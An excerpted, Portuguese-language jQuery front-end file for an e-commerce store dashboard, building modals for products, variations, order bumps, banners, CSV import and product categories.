    ...
    let _global = {
        ...
        alteraCorTema() {
            ...
            $(".btn_tema").click(function(e) {
                ...
                $("#cor_fundo").attr('style', 'background-image: ' + coresTema[tema] + ';');

                $(".iconecard").each((i, v) => {
                    console.log('oi')
                    $(v).attr('style', 'background-image: ' + coresTema[tema] + ';');
                })
                ...
                $.ajax({
                    ...
                    success: (retorno, xhr) => {
                        $.post('/dashboard/atualizaCorTema', {
                            cor: coresTema[tema]
                        }, (r) => {})
                    },
                    error: (retorno, xhr) => {},
                    ...
                    if (retorno.status != 401) {
                        $(retorno).each((index, data) => {
                            $("#divmodal_lojas").append(
                                ...
                                '<ul class="nav nav-pills nav-fill p-1" id="pai_modal_' + data.id_loja + '" role="tablist">' +
                                '<li class="nav-item activemodal" aba="dadosloja_' + data.id_loja + '">' +
                                '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' + data.id_loja + ' active" aba="dadosloja_' + data.id_loja + '" data-bs-toggle="tab"' +
                                ...
                                // "</a>" +
                                // "</li>" +
                                '<li class="nav-item " aba="produtos_' + data.id_loja + '">' +
                                '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' + data.id_loja + '" aba="produtos_' + data.id_loja + '" data-bs-toggle="tab" role="tab"' +
                                'aria-controls="code" aria-selected="false">' +
                                '<i class="ni ni-app text-sm me-2"></i> Produtos' +
                                "</a>" +
                                "</li>" +
                                '<li class="nav-item " style="display: none;" aba="loja_' + data.id_loja + '">' +
                                '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' + data.id_loja + '" aba="loja_' + data.id_loja + '" data-bs-toggle="tab" role="tab"' +
                                'aria-controls="code" aria-selected="false">' +
                                ...
                                // "</a>" +
                                // "</li>" +
                                '<li style="display: none;" class="nav-item " aba="banners_' + data.id_loja + '">' +
                                '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' + data.id_loja + '" aba="banners_' + data.id_loja + '" data-bs-toggle="tab" role="tab"' +
                                'aria-controls="code" aria-selected="false">' +
                                ...
                                "</div>" +
                                "</div>" +
                                '<div class="card-body pb-3 flex" id="divdadosloja_' + data.id_loja + '">' +
                                ...
                                data.id_loja +
                                '" value="' +
                                (data.cor_loja == undefined || data.cor__loja == null ?
                                    "#312edb" :
                                    data.cor_loja) +
                                '" title="Escolha a Cor">' +
                                "<span>E-Mail de Rodapé</span>" +
                                '<input class="form-control" type="text" value="' +
                                (data.email_loja == null ? "" : data.email_loja) +
                                '"id="email_loja_' +
                                data.id_loja +
                                '">' +
                                "<span>CNPJ de Rodapé</span>" +
                                '<input class="form-control" type="text" value="' +
                                (data.cnpj_loja == null ? "" : data.cnpj_loja) +
                                '" id="cnpj_loja_' +
                                data.id_loja +
                                '">' +
                                '<span>Layout do Checkout</span>  ' +
                                '<select class ="form-control" id="tipo_checkout_loja_' + data.id_loja + '"></select>' +
                                "</div>" +
                                ...
                                '<img class="imgmodal" id="img_modal_' + data.id_loja + '" src="http://' + (data.img_loja != null && data.img_loja != undefined ? data.img_loja : window.location.host + '/logo/pergunta.png') + '" alt="logo"/>' +
                                '</div>' +
                                '</div>' +
                                "</div>" +
                                '<div class="card-body pb-3" style="display: none;" id="divpagamento_' + data.id_loja + '">' +
                                "<div>pagamento</div>" +
                                "</div>" +
                                '<div class="card-body pb-3 flex" style="display: none;" id="divprodutos_' + data.id_loja + '">' +
                                '<div class="widthmodal flex">' +
                                '<div class="container-fluid">' +
                                '<div class="row">' +
                                '<div class="col-lg-12 card" id="divprodutomodal" style="margin: 5px; justify-content:center; align-items: center;">' +
                                '<div class="py-2 flex flex-column width100" id="grid_produtos_' + data.id_loja + '" style="border: 0px; height: 400px;"></div>' +
                                '<div id="quill_produtos_loja_' + data.id_loja + '" div="produtos_' + data.id_loja + '" class="col-lg-6 card flex" style="margin: 5px; display: none; width: 100% !important; height: 100% !important;">' +
                                '<div id="quill_' + data.id_loja + '" style="height: inherit; min-height: inherit;"></div>' +
                                '</div>' +
                                ...
                                '</div>' +
                                '</div>' +
                                '<div id="div_adicionar_produto_' + data.id_loja + '" class="widthmodal flex" style="width: 40%;">' +
                                '<div class="container-fluid">' +
                                '<div class="row">' +
                                '<div class="col-lg-12 card" style="margin: 5px; justify-content:center;">' +
                                '<button style="margin-top: 15px;" loja="' + data.id_loja + '" id="adiciona_produto_' + data.id_loja + '"class="btn btn-primary">Adicionar Produto</button>' +
                                '<button type="button" style="margin-top: 5px;" id="adiciona_variacao_' + data.id_loja + '" class="btn btn-info">Adicionar Variação</button>' +
                                '<button type="button" style="margin-top: 5px;background: #b412b4;" id="orderbump_' + data.id_loja + '" class="btn btn-warning">Order Bump</button>' +
                                '<button type="button" style="margin-top: 5px;" id="script_' + data.id_loja + '" class="btn btn-warning">Script</button>' +
                                '<button style="margin-top: 5px;" loja="' + data.id_loja + '" id="deleta_produto_' + data.id_loja + '"class="btn btn-danger">Deletar Produto</button>' +
                                '</div>' +
                                ...
                                data.id_loja +
                                '" >' +
                                '<button style="width: 100%; margin-top: 10px; height: 40px;" class="btn btn-primary" id="importa_csv_loja_' + data.id_loja + '">Importar</button>' +
                                '</div>' +
                                '</div>' +
                                '</div>' +
                                '</div>' +
                                '<div class="flex card" style="width: 40%; margin: 5px; justify-content: center; align-items: center; display: none;" id="div_variacao_' + data.id_loja + '">' +
                                '</div>' +
                                '<div id="div_adicionar_produto_form_' + data.id_loja + '" class="widthmodal flex" style="display: none; width: 40%;">' +
                                '<div class="container-fluid">' +
                                '<div class="row">' +
                                '<div class="col-lg-12 card" style="margin: 5px; justify-content:center; align-items: center;">' +
                                '<button class="btn btn-success" style="    margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px;" id="div_voltar_produtos_' + data.id_loja + '"><i class="ni ni-bold-left" style="margin: 4px;"></i>Voltar</button>' +
                                ...
                                '<span>Imagem 2</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_2_' + data.id_loja +
                                '" >' +
                                '</div>' +
                                '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                '<span>Imagem 3</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_3_' + data.id_loja +
                                '" >' +
                                '</div>' +
                                '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                '<span>Imagem 4</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_4_' + data.id_loja +
                                '" >' +
                                '</div>' +
                                '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                '<span>Imagem 5</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_5_' + data.id_loja +
                                '" >' +
                                '</div>' +
                                '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                '<span>Imagem 6</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_6_' + data.id_loja +
                                '" >' +
                                '</div>' +
                                '</div>' +
                                '<span style="margin-top: 10px;">Nome do produto</span>' +
                                '<input class="form-control" placeholder="Nome do produto" id="nome_produto_' + data.id_loja + '" >' +
                                '<span style="margin-top: 10px;">Preço</span>' +
                                '<input type="number" step="0.01" min="0" max="100000" class="form-control" placeholder="Preço" id="preco_produto_' + data.id_loja + '" >' +
                                '<button style="width: 100%; margin-top: 10px; height: 40px;" class="btn btn-primary" id="add_produto_' + data.id_loja + '">Adicionar Produto</button>' +
                                '</div>' +
                                "</div>" +
                                '</div>' +
                                '</div>' +
                                '</div>' +
                                "</div>" +
                                '<div class="card-body pb-3" style="display: none;" id="divloja_' + data.id_loja + '">' +
                                '<div class="flex">' +
                                '<div class="container-fluid">' +
                                '<div class="row" style="margin-top: 15px;" id="loja_row">' +
                                '<div class="col-lg-9 flex" id="tab_loja">' +
                                '<ul class="nav nav-pills nav-fill p-1" tab="produtos_' + data.id_loja + '" role="tablist">' +
                                '<li class="nav-item tab_loja selected_tab_loja" texto="Produtos ativos em sua loja" aba="produtos_' + data.id_loja + '">' +
                                '<a class="nav-link mb-0 px-0 py-1 cursorpointer tab_' + data.id_loja + ' active" tab="loja_' + data.id_loja + '" data-bs-toggle="tab"' +
                                'role="tab" aria-controls="preview" aria-selected="true">' +
                                '<i class="ni ni-badge text-sm me-2"></i> Produtos' +
                                "</a>" +
                                "</li>" +
                                '<li class="nav-item tab_loja" texto="Categorias dos produtos da sua loja" aba="categoria_' + data.id_loja + '">' +
                                '<a class="nav-link mb-0 px-0 py-1 cursorpointer tab_' + data.id_loja + ' active" tab="categoria_' + data.id_loja + '" data-bs-toggle="tab"' +
                                'role="tab" aria-controls="preview" aria-selected="true">' +
                                '<i class="ni ni-badge text-sm me-2"></i> Categorias' +
                                "</a>" +
                                "</li>" +
                                '</ul>' +
                                '<select style="width: 300px; height: 90%; margin-top: 2px; margin-left: 20px;" id="select_prod_categoria_' + data.id_loja + '" class="form-control">' +
                                ...
                                '<span id="texto_loja_' + data.id_loja + '">Produtos ativos em sua loja</span>' +
                                '</div>' +
                                '<div id="div_conteudo_loja"style="display: flex; height: 100%;">' +
                                '<div  div="categoria_' + data.id_loja + '" class="divs_loja_' + data.id_loja + ' card col-lg-4 flex" style="display: none;margin: 5px; justify-content:center; align-items: center;">' +
                                '<span style="align-items: start; margin-top: 10px;">Selecione a Categoria</span>' +
                                '<select style="width: 75%;" class="form-control" id="categorias_produto_' + data.id_loja + '">' +
                                '</select>' +
                                '<button id="deleta_categoria_' + data.id_loja + '" class="col-lg-4 btn btn-danger" style="width: 75%; height: 40px; margin-bottom: 25px; margin-top: 5px;">Deletar Categoria</button>' +
                                '</div>' +
                                '<div  div="categoria_' + data.id_loja + '" class="divs_loja_' + data.id_loja + ' card col-lg-3 flex" style="display: none;margin: 5px; justify-content:center; align-items: center;">' +
                                '<span style="margin-top: 10px;">Nome da Categoria</span>' +
                                '<input style="width: 240px;" id="add_categoria_' + data.id_loja + '" type="text" class="form-control">' +
                                '<button id="btn_categoria_' + data.id_loja + '" class="col-lg-4 btn btn-primary" style="width: 240px; height: 40px; margin-bottom: 25px; margin-top: 5px;">Adicionar Categoria</button>' +
                                '</div>' +
                                '<div id="grid_produtos_loja_' + data.id_loja + '" div="produtos_' + data.id_loja + '" class="divs_loja_' + data.id_loja + ' col-lg-6 card flex" style="margin: 5px; justify-content:center; width: 100%; height: 400px; align-items: center;">' +
                                '</div>' +
                                '</div>' +
                                '</div>' +
                                '</div>' +
                                '</div>' +
                                "</div>" +
                                '<div class="card-body pb-3" style="display: none;" id="divpixel_' + data.id_loja + '">' +
                                '<div class="widthmodal flex">' +
                                '<div class="container-fluid">' +
                                '<div class="row">' +
                                ...
                                '</div>' +
                                "</div>" +
                                '<div class="card-body pb-3" style="display: none;" id="divbanners_' + data.id_loja + '">' +
                                '<div class="container-fluid">' +
                                '<div class="row" style="margin-top: 10px;">' +
                                '<div class="col-lg-3 card flex" style="margin: 5px; justify-content:center; align-items: center;">' +
                                '<h6>Banner 1</h6>' +
                                '<span>Banner Desktop</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="banner1_desktop_' + data.id_loja + '">' +
                                '<span>Banner Mobile</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="banner1_mobile_' + data.id_loja + '">' +
                                '<button class="btn btn-primary btnbanner" loja="' + data.id_loja + '" banner="1">Adicionar</button>' +
                                '</div>' +
                                '<div class="col-lg-3 card flex" style="margin: 5px; justify-content:center; align-items: center;">' +
                                '<h6>Banner 2</h6>' +
                                '<span>Banner Desktop</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="banner2_desktop_' + data.id_loja + '">' +
                                '<span>Banner Mobile</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="banner2_mobile_' + data.id_loja + '">' +
                                '<button class="btn btn-primary btnbanner" loja="' + data.id_loja + '" banner="2">Adicionar</button>' +
                                '</div>' +
                                '<div class="col-lg-3 card flex" style="margin: 5px; justify-content:center; align-items: center;">' +
                                '<h6>Banner 3</h6>' +
                                '<span>Banner Desktop</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="banner3_desktop_' + data.id_loja + '">' +
                                '<span>Banner Mobile</span>' +
                                '<input class="form-control" enctype="multipart/form-data" type="file" id="banner3_mobile_' + data.id_loja + '">' +
                                '<button class="btn btn-primary btnbanner" loja="' + data.id_loja + '" banner="3">Adicionar</button>' +
                                '</div>' +
                                '</div>' +
                                '</div>' +
                                "</div>" +
                                '<div class="card-body pb-3" style="display: none;" id="divconfig_' + data.id_loja + '">' +
                                "<div>config</div>" +
                                "</div>" +
                                "</div>" +
                                "</div>" +
                            ...
                            $("#tipo_checkout_loja_" + data.id_loja).append(_global.optionSelectLayout);
                            $("#tipo_checkout_loja_" + data.id_loja).val(data.cd_tipo_checkout).change();
                            ...
                            $("#btn_salva_" + data.id_loja).click(function(e) {
                                ...
                                formData.append("imagem", $("#img_loja_" + data.id_loja)[0].files[0]);
                                formData.append("nm_loja", $("#nm_loja_" + data.id_loja).val())
                                formData.append("cor_loja", $("#cor_loja_" + data.id_loja).val())
                                formData.append("email_loja", $("#email_loja_" + data.id_loja).val())
                                ...
                                $.ajax({
                                    ...
                                    success: function(retorno) {
                                        if (retorno.status == 200) {
                                            ...
                                            let pai = $("#img_modal_" + retorno.id_loja).parent();
                                            $("#img_modal_" + retorno.id_loja).remove();
                                            $(pai).append(
                                                $("<img>", {
                                                    src: 'http://' + (retorno.img != null && retorno.img != undefined ? retorno.img : window.location.host + '/logo/pergunta.png'),
                                                    id: 'img_modal_' + retorno.id_loja,
                                                    class: 'imgmodal'
                                                })
                                            );
                                        }
                            ...
                            $(".tab_loja").click(function(e) {
                                ...
                                let selecionada = $(e.currentTarget).attr('aba');
                                $("#texto_loja_" + data.id_loja).text($(this).attr('texto'))


                                $(".tab_loja").each((index, data) => {
                                    if ($(data).attr('aba') != selecionada) {
                                        $(data).removeClass('selected_tab_loja')
                                    } else {
                                        $(data).addClass('selected_tab_loja')
                                    }
                                })

                                $(".divs_loja_" + data.id_loja).each((index, data) => {
                                    if ($(data).attr('div') != selecionada) {
                                        $(data).hide()
                                    } else {
                                        $(data).show()
                                    }
        ...
        orderBump(idloja) {
            $("#orderbump_" + idloja).off('click').on('click', async function(e) {
                e.preventDefault();

                let id = $('#grid_produtos_' + idloja).jqxGrid('getselectedrowindex');
                let dados = $("#grid_produtos_" + idloja).jqxGrid('getrowdata', id);
                ...
                let req = await _global.busca('dashboard/getOrderBumpProduto', {
                    p: produto,
                    l: idloja
                }, 'POST');
                        ...
                        $("<div>", {
                            ...
                            $("<button>", {
                                ...
                                click: function(e) {
                                    ...
                                    $("#orderbump_" + idloja).prop('disabled', false);
                                    $("#adiciona_produto_" + idloja).prop('disabled', false);
                                    $("#adiciona_variacao_" + idloja).prop('disabled', false);
                                    $("#deleta_produto_" + idloja).prop('disabled', false);
                                    $("#script_" + idloja).prop('disabled', false);
                                    $("#importa_csv_loja_" + idloja).prop('disabled', false);
                            ...
                            $("<button>", {
                                ...
                                click: function(e) {
                                    ...
                                    $("#orderbump_valor").val(0.00).change();
                        ...
                        $("<div>", {
                            ...
                            $("<div>", {
                                ...
                                $("<button>", {
                                    ...
                                    p: produto,
                                    click: async function(e) {
                                        if ($(this).attr('p') == $("#select_orderbump").val()) {
                                            _global.toast('Você não pode atrelar o mesmo produto no Order Bump!', 'toasterro');
                                            return;
                                        }
                                        _global.btnCarregando($(this), true, 'Salvar');
                                        let p = $(this).attr('p');
                                        let o_p = $("#select_orderbump").val();
                                        let o_vl = $("#orderbump_valor").val();

                                        let req = await _global.busca('dashboard/updateOrderBump', {
                                            p: p,
                                            o_p: o_p,
                                            o_vl: o_vl
                                        }, 'POST');
                                        ...
                                        if (req.status == 200) {
                                            _global.toast('Os valores foram atualizados.', 'toastsucesso');
                                            $("#voltar_temp").click();
                                        } else {
                                            _global.toast('Houve um erro interno.', 'toasterro');
        ...
        adicionaVariacao(idloja) {
            $("#adiciona_variacao_" + idloja).off('click').on('click', function(e) {
                e.preventDefault();

                let _id = $('#grid_produtos_' + idloja).jqxGrid('getselectedrowindex');

                if (_id == undefined || _id == -1) {
                    _global.toast('Selecione um produto na tabela', 'toasterro');
                    return;
                }

                let dados = $("#grid_produtos_" + idloja).jqxGrid('getrowdata', _id);
                let produto = dados.id_produto;
                ...
                $("#grid_produtos_" + idloja).parent().hide()
                $("#adiciona_produto_" + idloja).prop('disabled', true);
                $("#adiciona_variacao_" + idloja).prop('disabled', true);
                $("#deleta_produto_" + idloja).prop('disabled', true);
                $("#script_" + idloja).prop('disabled', true);
                ...
                for (i = 1; i <= 3; i++) {
                    ...
                    let _variacoes = "";
                    let titulo;
                    if (variacoes['variacao' + i].variacao != null && variacoes['variacao' + i].opcao != null) {
                        titulo = variacoes['variacao' + i].variacao;
                        opt = variacoes['variacao' + i].opcao.split('%flag%');
                        opt.pop();
                        opt.forEach((v, i) => {
                            _variacoes += v + ';';
                        })
                    ...
                    $("#grid_produtos_" + idloja).parent().parent().append(
                        $("<div>", {
                            ...
                            $("<div>", {
                                ...
                                $("<button>", {
                                    ...
                                    l: idloja,
                                    click: async function(e) {
                                        if ($("#titulo_" + $(this).attr('i')).val() == '') {
                                            _global.toast('Digite um título para a variação!', 'toastwarning')
                                            return;
                                        }

                                        window.varTempTitulo = $("#titulo_" + $(this).attr('i')).val();
                                        window.varTempNumero = $(this).attr('i');

                                        let _i = $(this).attr('i');
                                        $(this).prop('disabled', true);
                                        let dados = await _global.busca('dashboard/getProdutosVariacao', { id_loja: idloja, i: _i, p: produto }, 'POST');
                                        ...
                                        $("#divinfovariacao").hide();
                                        $("#btn_voltar_variacao").hide();
                                        $("#grid_produtos_" + idloja).parent().parent().append(
                                            $("<div>", {
                                                class: 'col-lg-12',
                                                id: 'divopcoes_var'
                                                ...
                                                $("<div>", {
                                                    ...
                                                    $("<button>", {
                                                        ...
                                                        click: function(e) {
                                                            ...
                                                            $("#divinfovariacao").show();
                                                            $("#btn_voltar_variacao").show();
                                                            $("#voltar_temp").remove();
                                                            $("#divopcoes_var").remove();
                                                            $("#divopcoes_var").remove();
                                                    ...
                                                    $("<button>", {
                                                        ...
                                                        click: async function(e) {
                                                            ...
                                                            if ($(".opcaotemporaria").length == 0) {
                                                                _global.toast('Adicione alguma variação.', 'toasterro');
                                                                return;
                                                            }
                                                            ...
                                                            if (_flag) {
                                                                _global.toast('Existem ' + aux + ' variações sem título p/ opção.', 'toasterro');
                                                                return;
                                                            }
                                                            ...
                                                            $(".opcaotemporaria").each((i, v) => {
                                                                l.push({
                                                                    opcao: $(v).find('input').val(),
                                                                    produto: $(v).find('select').val()
                                                                })
                                                            })
                                                            ...
                                                            let busca = async function() {
                                                                return new Promise((res) => {
                                                                    let dados = _global.busca('dashboard/salvaVariacaoNovo', {
                                                                        i: window.varTempNumero,
                                                                        titulo: window.varTempTitulo,
                                                                        variacao: string_titulo,
                                                                        produto: string_produto,
                                                            ...
                                                            busca().then((dados) => {
                                                                if (dados.status == 200) {
                                                                    _global.toast('As informações foram salvas com sucesso.', 'toastsucesso');
                                                                    $("#voltar_temp").click();
                                                                } else {
                                                                    _global.toast('Não foi possível salvar as informações', 'toasterro');
                                                                }
                                        ...
                                        if (dados.produtos != null) window.tempVariacao = dados.produtos;
                                        dados.variacao.forEach((v, i) => {
                                            $("#divopcoes_var").append(
                                                $("<div>", {
                                            ...
                                            if (dados.produtos != null) {
                                                window.tempVariacao = dados.produtos;
                                                dados.produtos.forEach((_v, _i) => {
                                                    $("#select_opcao" + i).append(
                                                        $("<option>", {
                                                            text: _v.ds_produto,
                                                            value: _v.id_produto
                                                        })
                                                ...
                                                if (dados.pvar != null) {
                                                    if (dados.pvar[i] != undefined && dados.pvar[i] != null && dados.pvar[i] != '-1') {
                                                        $("#select_opcao" + i).val(dados.pvar[i]).change();
                                                    }
                                                } else {
                                                    $("#select_opcao" + i).append(
                                                        $("<option>", {
                                            ...
                                            $("<div>", {
                                                ...
                                                $("<button>", {
                                                    ...
                                                    click: function(e) {
                                                        ...
                                                        ).insertBefore($("#add_opcao_temp"));

                                                        window.tempVariacao.forEach((v, i) => {
                                                            $("#select_opcao" + vl).append(
                                                                $("<option>", {
                                                                    text: v.ds_produto,
                                                                    value: v.id_produto
                                                                })
                ...
                $(".salvavariacao").click(function(e) {
                    ...
                    _global.btnCarregando($(_this), true, 'Salvar');
                    if ($("#titulo_" + i).val() == "") {
                        _global.toast('Digite um título à variação.', 'toastwarning');
                        return;
                    }

                    if ($("#opcoes_" + i).val() == "") {
                        _global.toast('Digite as variações.', 'toastwarning');
                        return;
                    }

                    if (!$("#opcoes_" + i).val().includes(';')) {
                        _global.toast('Verifique as opções, o delimitador deve ser ;', 'toasterro')
                        return;
                    }
                    ...
                    if (verifica.length == 2) {
                        if (verifica[1] == '') {
                            _global.toast('É necessário ter no mínimo duas variações, verifique suas opções.', 'toasterro');
                        }
                    }
                    ...
                    const conecta = async function() {
                        conectar = await _global.busca('dashboard/salvaVariacao', {
                            a1: 'variacao' + i,
                            a2: titulo,
                            b1: 'opcao' + i,
                            b2: valor,
                    ...
                    conecta().then(() => {
                        if (conectar.status == 200) {
                            _global.minhasLojas();
                            _global.toast('As variações foram salvas com sucesso.', 'toastsucesso');
                        } else {
                            _global.toast('Houve um erro ao salvar as variações', 'toasterro');
                        }

                        _global.btnCarregando($(_this), false, 'Salvar');
                    })
                })
                $("#grid_produtos_" + idloja).parent().parent().prepend(
                    $("<div>", {
                        class: 'col-lg-12',
                        ...
                        $("<div>", {
                            ...
                            $("<button>", {
                                ...
                                click: function(e) {
                                    ...
                                    $("#script_" + idloja).prop('disabled', false);
                                    $("#importa_csv_loja_" + idloja).prop('disabled', false);
                                    $("#grid_produtos_" + idloja).parent().show()
        ...
        geraScript(idloja) {
            $("#script_" + idloja).off('click').on('click', async function(e) {
                e.preventDefault();
                const usuario = _global.getUsuario();
                let _dados = await _global.busca('dashboard/getDominioCheckout', {
                    id_usuario: usuario.id_usuario
                }, 'POST');
                        ...
                        $("<div>", {
                            ...
                            $("<pre>").append(
                                $("<code>", {
                                    id: 'code',
                                    class: 'javascript',
                                    text: (_dados.dominio == null ? 'Não há domínio p/ checkout cadastrado.' : `$(document).ready(function(){
    ...
    $(v).click(function(e){
        ...
        bannerLoja() {
            $(".btnbanner").click(function(e) {
                ...
                const usuario = _global.getUsuario();
                var formData = new FormData();
                let bannerDesktop = $("#banner" + nBanner + "_desktop_" + loja)[0].files[0];
                let bannerMobile = $("#banner" + nBanner + "_mobile_" + loja)[0].files[0];
                let _this = $(this);
                ...
                if (bannerDesktop == undefined) {
                    _global.toast('É necessário inserir uma imagem para desktop.', 'toastwarning');
                    return;
                }
                if (bannerMobile == undefined) {
                    _global.toast('É necessário inserir uma imagem para mobile.', 'toastwarning');
                    return;
                }
                ...
                $.ajax({
                    ...
                    success: function(retorno) {
                        if (retorno.status == 200) {
                            _global.toast('Os banners foram salvos com sucesso.', 'toastsucesso');

                        }
                        if (retorno.status == 500) {
                            _global.toast('Não foi possível salvar os banners', 'toasterro');
                        }
        ...
        adicionarProdutosManual(idloja) {
            $("#add_produto_" + idloja).click(function(e) {
                ...
                if (produto.length < 1) {
                    _global.toast('É necessário informar o nome do produto!', 'toastwarning');
                    return;
                }
                if (preco.length < 1 || isNaN(preco)) {
                    _global.toast('É necessário informar o preço do produto!', 'toastwarning');
                    return;
                }

                if ($("#img_produto_1_" + idloja)[0].files[0] == undefined) {
                    _global.toast('É necessário carregar pelo menos uma imagem para o produto!', 'toastwarning');
                    return;
                }
                ...
                formData.append("imagem1", $("#img_produto_1_" + idloja)[0].files[0]);
                formData.append("imagem2", $("#img_produto_2_" + idloja)[0].files[0]);
                formData.append("imagem3", $("#img_produto_3_" + idloja)[0].files[0]);
                formData.append("imagem4", $("#img_produto_4_" + idloja)[0].files[0]);
                formData.append("imagem5", $("#img_produto_5_" + idloja)[0].files[0]);
                formData.append("imagem6", $("#img_produto_6_" + idloja)[0].files[0]);
                    ...
                    success: function(retorno) {
                        if (retorno.status == 200) {
                            ...
                            setTimeout(() => {
                                ...
                                _global.btnCarregando(_this, false, 'Adicionar Produto');
            ...
            $.ajax({
                ...
                success: (retorno) => {
                    ...
                    var getLocalization = function() {
                        var localizationobj = {};
                        localizationobj.emptydatastring = "Nenhum produto encontrado para esta loja.";
                        localizationobj.loadtext = "Carregando...";
                        localizationobj.groupsheaderstring = "Arraste uma coluna aqui para agrupar os dados retornados";
                    ...
                    $("#grid_produtos_" + idloja).jqxGrid({
                        ...
                        theme: 'fluent',
                        columns: [
                            { text: 'ID', datafield: 'id_produto', hidden: false, editable: false, width: '7%', align: "center", cellsalign: 'center', },
                            { text: 'Produto', datafield: 'titulo', width: '63%', align: "center", cellsalign: 'center', },
                            { text: 'Preço Atual', datafield: 'preco', width: '15%', align: "center", cellsalign: 'center', },
                            { text: 'Preço Anterior', datafield: 'preco_anterior', width: '15%', align: "center", cellsalign: 'center', },
                            { text: 'Loja', datafield: 'sn_loja', width: '7%', columntype: 'checkbox', align: "center", cellsalign: 'center', },
                        ]
                    });

                    $("#grid_produtos_" + idloja).on('cellendedit', function(event) {
                        ...
                        if (datafield == 'sn_loja') {
                            $.ajax({
                                ...
                                success: (retorno) => {
                                    if (retorno.status == 200) {
                                        _global.toast('O produto foi ' + (newvalue == true ? 'ativado' : 'desativado') + ' com sucesso em sua loja', 'toastsucesso')
                                        _global.setAbaLojaModal(idloja);
                                    } else {
                                        _global.toast('Não foi possível ' + (newvalue == true ? 'ativar' : 'desativar') + ' o produto em sua loja')
                                    }
                                    return;
                                }
                            })
                        ...
                        if (datafield == 'preco') {
                            ...
                            if (isNaN(preco)) {
                                _global.toast('Digite um valor númerico para o preço do produto', 'toasterro')
                                row.preco = oldvalue;
                                return;
                        ...
                        $.ajax({
                            ...
                            success: (retorno) => {
                                if (retorno.status == 200) {
                                    _global.toast((campo == 'preco_anterior' ? 'O preço anterior' : campo) + ' foi atualizado com sucesso!', 'toastsucesso');
                                    if (campo == 'titulo') {
                                        row.titulo = newvalue;
                                    ...
                                    $("#grid_produtos_" + idloja).jqxGrid('updaterow', row.boundindex, row);

                                } else if (retorno.status == 401) {
                                    _global.toast('Não foi possível atualizar: ' + campo, 'toasterro');
                                    if (campo == 'titulo') {
                                        row.titulo = oldvalue;
                                    } else if (campo == 'preco_anterior') {
                            ...
                            error: () => {
                                _global.toast('Houve um erro interno ao salvar.', 'toasterro');
                    ...
                    $("#deleta_produto_" + idloja).on('click', function(e) {
                        ...
                        e.stopPropagation();
                        let loja = $(this).attr('loja');
                        var row = $("#grid_produtos_" + loja).jqxGrid('getselectedrowindex');
                        var data = $("#grid_produtos_" + loja).jqxGrid('getrowdata', row);
                        ...
                        $.ajax({
                            ...
                            success: (retorno) => {
                                if (retorno.status == 200) {
                                    _global.toast('O produto foi deletado com sucesso', 'toastsucesso');
                                    $("#grid_produtos_" + loja).jqxGrid('deleterow', data.uid);

                                } else if (retorno.status == 401) {
                                    _global.toast('Não foi possível deletar o produto', 'toasterro');
                                }
                                $(this).prop('disabled', false);
                            },
                            error: () => {
                    ...
                    $("#importa_csv_loja_" + idloja).on('click', function(e) {
                        ...
                        e.stopImmediatePropagation();
                        let thisbotao = $(this);
                        if ($("#csv_loja_" + idloja).val() == "" || $("#csv_loja_" + idloja).val() < 1) {
                            _global.toast('Carregue um arquivo para importar!', 'toastwarning');
                            return;
                        }
                        ...
                        if (csv_valor[1] != 'csv') {
                            _global.toast('São aceitos somente arquivos com extensão .csv', 'toasterro');
                            return;
                        }
                        $(this).text("");
                        $(this).removeClass("btn-primary");
                        ...
                        const usuario = _global.getUsuario();
                        var formData = new FormData();
                        formData.append("csv", $("#csv_loja_" + idloja)[0].files[0]);
                        formData.append("id_loja", idloja)
                        formData.append("id_usuario", usuario.id_usuario)
                        formData.append("tipo_usuario", usuario.tipo_usuario)
        ...
        setAbaLojaModal(idloja) {
                    ...
                    $.ajax({
                        ...
                        success: (retorno) => {
                            ...
                            $("#grid_produtos_loja_" + idloja).jqxGrid({
                                ...
                                theme: 'fluent',
                                columns: [
                                    { text: 'ID', datafield: 'id_produto', editable: false, width: '5%', align: "center", cellsalign: 'center', },
                                    { text: 'Produto', datafield: 'titulo', width: '60%', align: "center", cellsalign: 'center', },
                                    {
                                        text: 'Categoria',
                                    ...
                                    { text: 'Preço', datafield: 'preco', width: '10%', align: "center", cellsalign: 'center', },
                                    { text: 'Ativo', datafield: 'sn_loja', width: '5%', columntype: 'checkbox', align: "center", cellsalign: 'center', },
                                ]
                            });

                            $("#grid_produtos_loja_" + idloja).on('rowselect', function(event) {
                                ...
                                const pai = $("#select_prod_categoria_" + idloja).parent()
                                $("#select_prod_categoria_" + idloja).remove();
                                $(pai).append('<select style="width: 300px; height: 90%; margin-top: 2px; margin-left: 20px;" id="select_prod_categoria_' + idloja + '" class="form-control"></select>')
                                $("#select_prod_categoria_" + idloja).append(
                                    $("<option>", {
                                        value: '-1',
                                ...
                                $("#select_prod_categoria_" + idloja).change(function(e) {
                                    e.stopImmediatePropagation();
                                    e.preventDefault();
                                    e.stopPropagation();
                                    var args = event.args;
                                    ...
                                    let thisselect = $(this)
                                    let valor = $(this).val();
                                    let texto = $("#select_prod_categoria_" + idloja + " option:selected").text();
                                    if (rowData.ds_categoria == texto) {
                                        _global.toast('Selecione uma categoria diferente da atual.', 'toastwarning');
                                        return;
                                    }
                                    if (valor == '-1') {
                                        _global.toast('Selecione uma categoria.', 'toastwarning');
                                        return;
                                    }
                                    ...
                                    $(this).prop('disabled', true);
                                    $.ajax({
